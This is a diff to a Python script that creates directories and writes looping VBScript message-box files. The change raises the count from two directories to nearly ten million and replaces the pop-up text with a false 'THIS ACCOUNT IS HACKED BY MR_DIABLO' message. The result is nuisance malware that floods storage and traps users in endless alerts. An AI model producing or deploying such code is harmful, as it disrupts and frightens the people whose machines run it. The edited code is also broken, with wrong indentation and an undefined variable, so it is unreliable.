@@ -2,9 +2,8 @@ import os
 
 def create_directories():
     # Define the directories to be created
-    directories = ["dir1", "dir2"]
-
-    for directory in directories:
+       for i in range(1, 10000000):
+        directory_name = f"dir{i}"
         try:
             # Create the directory
             os.makedirs(directory, exist_ok=True)
@@ -12,7 +11,7 @@ def create_directories():
             
             # Create the VBScript content
             vbs_code = '''do
-MsgBox "Hay guys"
+MsgBox "THIS ACCOUNT IS HACKED BY MR_DIABLO"
 loop'''
             
             # Define the file path for the VBScript
